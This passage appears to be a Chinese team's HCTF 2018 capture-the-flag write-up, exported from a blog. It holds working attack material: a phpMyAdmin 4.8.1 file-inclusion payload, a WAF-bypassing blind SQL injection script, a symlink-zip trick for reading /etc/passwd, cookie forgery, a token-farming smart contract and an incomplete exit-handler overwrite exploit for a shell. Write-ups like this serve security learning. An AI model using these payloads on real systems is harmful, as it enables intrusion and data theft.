game\n这个题题目大概就是把4个字符的ascii码作为参数进行正弦变换然后加起来的结果，看完代码发现最后乘的rge并没有卵用所以可以消掉，就变成了y/7 = sin() + sin() + sin() + sin()的样子，所以我找了y/7 > 3的y作为约束条件，因为此时对应的四个sin()值必须都要大于y/7-3。本来是想把这个作为约束条件缩小范围再爆破的，结果用这个条件基本上就能把答案约束出来了，中间好像只有一组数是需要进一步爆破的，但剩的也不多所以很容易就获得了结果。代码如下：\n```python\nfrom pwn import *\nimport numpy as np\n\ndef show(mylist,testlist):\n    for i in range(len(testlist)):\n        if mylist[testlist[i][0]] < testlist[i][1] - 3.0 :\n            return False\n    return True\n\np = remote('150.109.119.46',6775)\nprint p.recv()\nprint p.recv()\np.sendline('y')\nprint p.recv()\np.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz')\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"137 212 218 251\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"57 79 80 210\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"89 128 170 130\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"28 117 198 213\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"95 111 169 222\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"2 75 210 213\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"38 162 175 180\")\n\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\nres = res[1:-1]\n\nnumlist = []\nressplit = res.split(',')\ntestlist = []\nfor i in range(len(ressplit)):\n    numlist.append(float(ressplit[i])/7.0)\n    if float(ressplit[i])/7.0 > 3.0:\n        testlist.append((i,float(ressplit[i])/7.0))\n\nprint testlist\n\nmylist = []\nfor i in range(256):\n    temp = []\n    x = np.linspace(0,1,1500)\n    y = np.sin(2*np.pi*x*i)\n    mylist.append(list(y))\n    if show(list(y),testlist) :\n        print i\n'''\ntemp = [88,89,128,129,130,169,170]\nprint testlist[2][1]\nfor a in temp:\n    for b in temp:\n        for c in temp:\n            for d in temp:\n                if mylist[a][testlist[2][0]] + mylist[b][testlist[2][0]] + mylist[c][testlist[2][0]] + mylist[d][testlist[2][0]] = testlist[2][1]:\n                    print a,b,c,d\n'''\np.interactive()\n\n```\n因为懒得把代码复制粘贴8遍，所以我是得到每轮结果以后把它保存下来，重开一个直接发过去的，所以最后脚本里只保留了最后一轮的过程，前面的都简化成了发结果。。。\n\n\n### Guess My Key\n这题听说是机器学习一开始没敢做，后来想想好像没那么难，题目思路是96bit的msg和96bit的key，可以任意提交msg和key来得到加密结果，或者提交msg获得用预设的key加密的结果，然后去猜题目预设的key。这个题我的思路是把raw_cipher当作一个空间向量，对每一bit的key去计算它是0和1时与key所获得的raw_cipher之间的距离来分析这1bit为0或1的概率，不断拟合使我计算所得的key与预设的key得到的空间向量不断接近，从而获得预设的key，代码如下：\n```python\nfrom urllib import *\nimport json\nurl = 'http://150.109.62.46:13577/enc?'\n\norilist = []\norilist.append([0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1])#0.00299699357119\norilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1])#0.00170157012619\norilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1])#0.00135932497845\norilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1])#0.000528410497059\n\n\nmsg = '1,'*95+'1'\nf = urlopen(url + 'msg=' + msg)\nmylist = json.loads(f.read())\noricipher = mylist['raw_cipher'].split(',')\n\ndef list2str(mylist):\n\tresult = ''\n\tfor i in mylist:\n\t\tif i == 1:\n\t\t\tresult += '1,'\n\t\telse:\n\t\t\tresult += '0,'\n\treturn result[:-1]\n\ndef getdst(tempcipher,oricipher):\n\tresult = 0.0\n\tfor i in range(len(oricipher)):\n\t\tresult += abs(pow(float(oricipher[i])-float(tempcipher[i]),2))\n\treturn result\n\nmyresult1 = []\nmyresult2 = []\n\nfor i in range(96):\n\tsumzerodst = 0.0\n\tsumonedst = 0.0\n\tmindst = 1.0\n\tminchr = -1\n\tfor j in range(len(orilist)):\n\t\tkey = orilist[j][:i] + [0] + orilist[j][i+1:]\n\t\tf = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(key))\n\t\tmylist = json.loads(f.read())\n\t\ttempcipher = mylist['raw_cipher'].split(',')\n\t\tdst = getdst(tempcipher,oricipher)\n\t\tif dst < mindst:\n\t\t\tmindst = dst\n\t\t\tminchr = 0\n\t\tsumzerodst += dst\n\t\tkey = orilist[j][:i] + [1] + orilist[j][i+1:]\n\t\tf = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(key))\n\t\tmylist = json.loads(f.read())\n\t\ttempcipher = mylist['raw_cipher'].split(',')\n\t\tdst = getdst(tempcipher,oricipher)\n\t\tif dst < mindst:\n\t\t\tmindst = dst\n\t\t\tminchr = 1\n\t\tsumonedst += dst\n\tmyresult1.append(minchr)\n\tif sumonedst > sumzerodst :\n\t\tmyresult2.append(0)\n\telse :\n\t\tmyresult2.append(1)\nprint \"======myresult======\"\nprint myresult1\nprint myresult2\nprint \"======myresult======\"\n\nf = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(myresult1))\nmylist = json.loads(f.read())\nmycipher1 = mylist['raw_cipher'].split(',')\n\nf = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(myresult2))\nmylist = json.loads(f.read())\nmycipher2 = mylist['raw_cipher'].split(',')\n\nprint getdst(mycipher1,oricipher)\nprint getdst(mycipher2,oricipher)\n\nif mycipher1 == oricipher:\n\tprint \"mycipher1\"\nif mycipher2 == oricipher:\n\tprint \"mycipher2\"\n```\n最开始我预设的orilist二维数组是[[1,0]*48,[0,1]*48,[1,1,0,0]*24,[0,0,1,1]*24],之后把距离结果空间向量更近的myresult作为新的key替换掉其中原本的key，一步一步缩小dst从而获得key的\n\n### easy dump\n\nVolatility + GIMP，可以查看内存里的内容，内存中有很多扫雷和写字板：i am boring真是服气2333\n在文件大概3/4的位置，可以看到flag在画图里\n```\nhctf{big_brother_is_watching_you}\n```\n\n### difficult programming language\n\n给了键盘流量包，可以使用一航师傅的脚本直接得到键盘输入的内容。【\\<GA\\>是～\\`】\n```\nD'`;M?!\\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\\a`_X|V[Tx;\"VONSRQJn1MFKJCBfFE>&<`@9!=<5Y9y7654-,P0/o-,%I)ih&%$#z@xw|{ts9wvXWm3~\n```\n题目名称叫difficult programming language，google了一下什么破语言长这个样子。。\n`Malbolge.`\n网上找到运行工具 https://zb3.me/malbolge-tools/#interpreter\n发现这个字符串里还有输错的一个字符。\n经另一个工具的调试，可以得知是一个:写成了\"号，解得flag\n```\nhctf{m4lb0lGe}\n```\n\n### Questionnaire\n\n谢谢杭电的师傅带来的题目们！\n\n## crypto\n\n### xor?rsa\n\n这题目去网上找了一个Coppersmith’s Short Pad Attack的脚本解就完事了(代码是sage的)。做的时候有时候会出bug我猜是因为程序只考虑了m1 < m2的情况\n```python\ndef short_pad_attack(c1, c2, e, n):\n    PRxy.<x,y> = PolynomialRing(Zmod(n))\n    PRx.<xn> = PolynomialRing(Zmod(n))\n    PRZZ.<xz,yz> = PolynomialRing(Zmod(n))\n\n    g1 = x^e - c1\n    g2 = (x+y)^e - c2\n\n    q1 = g1.change_ring(PRZZ)\n    q2 = g2.change_ring(PRZZ)\n\n    h = q2.resultant(q1)\n    h = h.univariate_polynomial()\n    h = h.change_ring(PRx).subs(y=xn)\n    h = h.monic()\n\n    kbits = n.nbits()//(2*e*e)\n    diff = h.small_roots(X=2^kbits, beta=0.5)[0]  # find root < 2^kbits with factor >= n^0.5\n\n    return diff\n\ndef related_message_attack(c1, c2, diff, e, n):\n    PRx.<x> = PolynomialRing(Zmod(n))\n    g1 = x^e - c1\n    g2 = (x+diff)^e - c2\n\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n\n    return -gcd(g1, g2)[0]\n\n\nif __name__ == '__main__':\n    n= 27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917\n    c1= 13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871\n    c2= 657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358\n    e = 5\n\n    diff = short_pad_attack(c1, c2, e, n)\n    print \"difference of two messages is %d\" % diff\n\n    m1 = related_message_attack(c1, c2, diff, e, n)\n    m2 = m1 + diff\n    print \"------\"\n    print m1\n    print \"------\"\n    print pow(m1,e,n)\n    print c1\n    print \"------\"\n    print m2\n    print \"------\"\n    print pow(m2,e,n)\n    print c2\n```\n\n### xor game \n\n[参考](https://www.anquanke.com/post/id/161171#h2-0)  \n原理是汉明码，脚本如下:\n```python\nimport base64\nimport string\n\n\ndef bxor(a, b):     # xor two byte strings of different lengths\n    if len(a) > len(b):\n        return bytes([x ^ y for x, y in zip(a[:len(b)], b)])\n    else:\n        return bytes([x ^ y for x, y in zip(a, b[:len(a)])])\n\n\ndef hamming_distance(b1, b2):\n    differing_bits = 0\n    for byte in bxor(b1, b2):\n        differing_bits += bin(byte).count(\"1\")\n    return differing_bits\n\n\ndef break_single_key_xor(text):\n    key = 0\n    possible_space = 0\n    max_possible = 0\n    letters = string.ascii_letters.encode('ascii')\n    for a in range(0, len(text)):\n        maxpossible = 0\n        for b in range(0, len(text)):\n            if(a == b):\n                continue\n            c = text[a] ^ text[b]\n            if c not in letters and c != 0:\n                continue\n            maxpossible += 1\n        if maxpossible > max_possible:\n            max_possible = maxpossible\n            possible_space = a\n    key = text[possible_space] ^ 0x20\n    return chr(key)\n\n\ntext = ''\nwith open('cipher.txt', 'r') as f:\n    for line in f:\n        text += line\nb = base64.b64decode(text)\n\n\nnormalized_distances = []\n\nfor KEYSIZE in range(2, 40):\n    b1 = b[: KEYSIZE]\n    b2 = b[KEYSIZE: KEYSIZE * 2]\n    b3 = b[KEYSIZE * 2: KEYSIZE * 3]\n    b4 = b[KEYSIZE * 3: KEYSIZE * 4]\n    b5 = b[KEYSIZE * 4: KEYSIZE * 5]\n    b6 = b[KEYSIZE * 5: KEYSIZE * 6]\n\n    normalized_distance = float(\n        hamming_distance(b1, b2) +\n        hamming_distance(b2, b3) +\n        hamming_distance(b3, b4) +\n        hamming_distance(b4, b5) +\n        hamming_distance(b5, b6)\n    ) / (KEYSIZE * 5)\n    normalized_distances.append(\n        (KEYSIZE, normalized_distance)\n    )\nnormalized_distances = sorted(normalized_distances, key=lambda x: x[1])\n\n\nfor KEYSIZE, _ in normalized_distances[:5]:\n    block_bytes = [[] for _ in range(KEYSIZE)]\n    for i, byte in enumerate(b):\n        block_bytes[i % KEYSIZE].append(byte)\n    keys = ''\n    try:\n        for bbytes in block_bytes:\n            keys += break_single_key_xor(bbytes)\n        key = bytearray(keys * len(b), \"utf-8\")\n        plaintext = bxor(b, key)\n        print(\"keysize:\", KEYSIZE)\n        print(\"key is:\", keys, \"n\")\n        s = bytes.decode(plaintext)\n        print(s)\n    except Exception:\n        continue\n\n```\n最后的结果:\nflag:```hctf{xor_is_interesting!@#}```\n\n## blockchain\n\n### bet2loss\n\n一血！是个dice2win早期版本+erc20的题目，开奖函数可以重放，但是没看出来通过哪一步的重放能获得token。\n每个账号会空投1000 token，只需要一万个账号就可以拿到flag。遂发动薅羊毛攻击。还是很慢，希望下次换个链哈哈哈。\n\n```\npragma solidity ^0.4.20;\ncontract Attack_7878678 {\n//    address[] private son_list;\n\n    function Attack_7878678() payable {}\n\n    function attack_starta(uint256 reveal_num) public {\n        for(int i=0;i<=50;i++){\n            son = new Son(reveal_num);\n        }\n    }\n\n    function () payable {\n    }\n}\n\ncontract Son_7878678 {\n\n    function Son_7878678(uint256 reveal_num) payable {\n        address game = 0x006b9bc418e43e92cf8d380c56b8d4be41fda319;\n        game.call(bytes4(keccak256(\"settleBet(uint256)\")),reveal_num);\n        game.call(bytes4(keccak256(\"transfer(address,uint256)\")),0x5FA2c80DB001f970cFDd388143b887091Bf85e77,950);\n    }\n    function () payable{\n    }\n}\n```\n\n```\nhctf{Ohhhh_r3p1ay_a77ack_f0r_c0n7r4ct}\n```\n\n### ez2win\n\n```\n_transfer(address from, address to, uint256 amount);\n```\n未设置权限，可以随便转。开源了以后很简单就能拿到flag。\n```\nhctf{0hhhh_m4k3_5ur3_y0ur_acc35s_c0n7r01}\n```\n","slug":"writeup-hctf2018","published":1,"updated":"2020-02-18T07:52:34.150Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck6rlh7tu001b21vw8w6zqc9j","content":"<p>来自杭电师傅的HCTF，比赛很有趣！本次比赛线上赛我们好像是第四还是第五，线下赛是Henryzhao，姚老板和禹越去的，拿了线下赛第一吼吼~</p>\n<a id=\"more\"></a>\n<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"warmup\"><a href=\"#warmup\" class=\"headerlink\" title=\"warmup\"></a>warmup</h3><p>phpmyadmin4.8.1的文件包含漏洞，截取和转义的问题。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>\n<h3 id=\"kzone\"><a href=\"#kzone\" class=\"headerlink\" title=\"kzone\"></a>kzone</h3><p>扫描目录发现/<a href=\"http://www.zip有源码，下载之，开始审计\" target=\"_blank\" rel=\"noopener\">www.zip有源码，下载之，开始审计</a><br>同时搜到了题目源码的出处，来自一个钓鱼网站模板；也搜到了一篇针对这个模板进行渗透的文章 <a href=\"https://bbs.ichunqiu.com/article-1518-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/article-1518-1.html</a></p>\n<p>/include/member.php存在注入，但是需要绕过safe.php的waf<br>在member.php中发现了json_decode<br>可以解析\\u0020这样的unicode编码<br>所以所有被waf检测到的字符全部使用此编码绕过<br>首先注出了后台账号密码 尝试登录但后台没有东西 于是猜测flag在数据库中 继续用脚本注入得到flag<br>注入的时候还碰到了大小写不敏感的问题 使用binary可以解决<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\">url = &quot;http://kzone.2018.hctf.io/admin/login.php&quot;</span><br><span class=\"line\">flag = &apos;&apos;</span><br><span class=\"line\">dic = &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+|,-./:;&lt;=&gt;?@&quot;</span><br><span class=\"line\">for x in range(1,50):</span><br><span class=\"line\">    for i in dic:</span><br><span class=\"line\">        startTime = time.time()</span><br><span class=\"line\">        #poc = &quot;&apos;\\u006fr\\u0020su\\u0062str(passwo\\u0072d,&#123;0&#125;,1)\\u003d&apos;&#123;1&#125;&apos;\\u0020and\\u0020sl\\u0065ep(6)\\u0023&quot;.format(x,chr(i))</span><br><span class=\"line\">        #admin BE933CBA048A9727A2D2E9E08F5ED046</span><br><span class=\"line\">        #poc = &quot;&apos;\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020table_name\\u0020from\\u0020inf\\u006frmation_schema.tables\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d&apos;&#123;1&#125;&apos;\\u0020and\\u0020sl\\u0065ep(6)\\u0023&quot;.format(x,i)</span><br><span class=\"line\">        #F1444g</span><br><span class=\"line\">        #poc = &quot;&apos;\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020column_name\\u0020from\\u0020inf\\u006frmation_schema.columns\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d&apos;&#123;1&#125;&apos;\\u0020and\\u0020sl\\u0065ep(6)\\u0023&quot;.format(x,i)</span><br><span class=\"line\">        #F1a9</span><br><span class=\"line\">        poc = &quot;&apos;\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020F1a9\\u0020from\\u0020F1444g\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d&apos;&#123;1&#125;&apos;\\u0020and\\u0020sl\\u0065ep(6)\\u0023&quot;.format(x,i)</span><br><span class=\"line\">        headers = &#123;&quot;Cookie&quot;:&apos;islogin=1; login_data=&#123;\\&quot;admin_user\\&quot;:\\&quot;&apos;+poc+&apos;\\&quot;&#125;&apos;&#125;</span><br><span class=\"line\">        r = requests.get(url,headers=headers)</span><br><span class=\"line\">        if time.time() - startTime &gt; 5:</span><br><span class=\"line\">            flag += i</span><br><span class=\"line\">            print flag</span><br><span class=\"line\">            break</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"admin\"><a href=\"#admin\" class=\"headerlink\" title=\"admin\"></a>admin</h3><p>这简直是我做ctf以来最神奇的一次经历<br>先是在fuzz过程中莫名其妙的拿到了flag<br>这一点其实想看看出题大佬怎么说的，感觉是后端数据库刷新的时候验证用户会出现问题。因为后来又复现成功了一次，具体操作是：在整点的时候注册admin账户提示已存在-&gt;再注册自己的账户提示注册成功后直接弹出flag，如下图…</p>\n<p><img src=\"http://cur5s-1.oss-cn-beijing.aliyuncs.com/18-11-12/75374228.jpg\" alt></p>\n<p>根据flag的内容知道考点是unicode cheat…队友研究了一波<br>注册 ᴬdmin，登录后修改密码，数据库会将真实admin的密码修改掉，然后再登录admin就可以了。<br>而后队友下午再次尝试复现的时候发现题目竟然在修改密码的页面给了源码…</p>\n<p>然后我们就成了 获得flag-&gt;根据flag获知解题方法-&gt;发现题目竟然给出了源码<br>ctf史上第一支倒着做题的队伍（手动捂脸<br>坐等官方大佬的wp解释一下非预期解的问题，估计有不少做出这道题的队伍是先拿到了flag</p>\n<h3 id=\"hideandseek\"><a href=\"#hideandseek\" class=\"headerlink\" title=\"hideandseek\"></a>hideandseek</h3><p>这题还是有意思，做起来每一步都很有道理，我们队好几个人一起做出来这个题。</p>\n<ol>\n<li>登录进去后，提示上传一个zip文件，发现他会cat这个文件，想到以前见过的上传硬连接。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s /etc/passwd ./templink</span><br><span class=\"line\">zip --symlink -r lala.zip ./templink</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>上传即可</p>\n<ol start=\"2\">\n<li>信息收集<br>权限很低，很多都读不了，但还是可以看看/proc下面的各种内容。</li>\n</ol>\n<ul>\n<li>/proc/self/environ，找到web服务目录。</li>\n<li>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 是运行的文件</li>\n<li>/app/hard_t0_guess_n9f5a95b5ku9fg/flag.py 不能直接读，尴尬</li>\n<li>/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html 读模板</li>\n</ul>\n<ol start=\"3\">\n<li>cookie伪造<br>看到key是随机数生成的，种子是uuid，uuid.getnode()是mac地址，可以<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>伪造一个username=admin的cookie就好啦。</p>\n<h3 id=\"game\"><a href=\"#game\" class=\"headerlink\" title=\"game\"></a>game</h3><p>这题目也很有趣，可以随意注册，登陆以后可以看到所有注册了的人的列表。看其他人注册了好多，思考为什么这么做。各种注入都试了，没有注入点。<br>看到了order=score，试着order=id，name都可以，又试着order=password，发现也行，震惊！<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import string</span><br><span class=\"line\">import os, random</span><br><span class=\"line\"></span><br><span class=\"line\">guess_list = string.printable</span><br><span class=\"line\"></span><br><span class=\"line\">old_password = &apos;dsA8&amp;&amp;!@#$%^&amp;D1NgY1as3DjA&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">def encode(length, op):</span><br><span class=\"line\">    a = &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, length/2))</span><br><span class=\"line\">    a += (op+&apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 2))).encode(&apos;base64&apos;)[:-1]</span><br><span class=\"line\">    a += &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, length/2))</span><br><span class=\"line\">    return a</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">for op in guess_list:</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">\t    &apos;username&apos;: &apos;TuTuXiXiHHH&apos;+ encode(len(old_password),op),</span><br><span class=\"line\">\t    &apos;password&apos;: old_password + op,</span><br><span class=\"line\">\t    &apos;sex&apos;:&apos;1&apos;,</span><br><span class=\"line\">\t    &apos;submit&apos;:&apos;submit&apos;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    requests.post(&quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;,data = data)</span><br><span class=\"line\">    print op, data</span><br></pre></td></tr></table></figure></p>\n<p>注册好多号不断的逼近admin的密码，登录后访问flag.php【user.php里有提示】，拿到flag。</p>\n<h2 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h2><h3 id=\"the-end\"><a href=\"#the-end\" class=\"headerlink\" title=\"the_end\"></a>the_end</h3><p>程序本身的功能为5次任意地址（用户输入）的1字节写随后调用exit()函数，且提供了sleep@libc的地址。通过单步跟踪exit()函数可以发现，程序在_dl_fini()函数中会<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call   QWORD PTR [rip+0x216414]        # 0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;</span><br></pre></td></tr></table></figure></p>\n<p>因此，只要将0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;处修改为one_gadget的地址即可拿到shell，刚好需要修改5个字节。<br>由于程序关闭了stdout，拿到shell后，使用<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">exec</span> /bin/sh 1&gt;&amp;0</span><br></pre></td></tr></table></figure></p>\n<p>执行sh并重定向标准输出流到标准输入流，即可与shell正常交互。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    BIN_PATH = <span class=\"string\">'./the_end'</span></span><br><span class=\"line\">    DEBUG = <span class=\"number\">1</span></span><br><span class=\"line\">    local = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> DEBUG == <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> local == <span class=\"number\">1</span>:</span><br><span class=\"line\">            p = process(BIN_PATH)</span><br><span class=\"line\">        